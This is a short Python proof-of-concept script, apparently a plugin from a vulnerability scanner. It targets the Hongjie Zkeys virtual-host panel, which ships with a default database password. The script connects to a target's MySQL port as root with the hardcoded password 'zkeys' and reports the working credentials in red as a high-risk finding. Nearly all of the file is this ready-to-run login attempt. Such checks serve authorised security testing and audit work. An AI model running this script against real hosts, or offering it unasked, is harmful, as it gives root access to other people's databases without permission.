#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 宏杰Zkeys虚拟主机默认数据库漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-048350
author: Lucifer
description: 宏杰Zkeys虚拟主机默认开启999端口，默认数据库密码zkeys可连接root。
'''
import sys
import pymysql
import warnings
from termcolor import cprint
from urllib.parse import urlparse

class zkeys_database_conf_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            host = self.url

        try:
            conn = pymysql.connect(host=host, user="root", passwd="zkeys", port=3306, connect_timeout=6)
            if conn.ping().server_status == 0:
                cprint("[+]存在宏杰Zkeys虚拟主机默认数据库漏洞...(高危)\tpayload: "+host+":3306"+" root:zkeys", "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = zkeys_database_conf_BaseVerify(sys.argv[1])
    testVuln.run()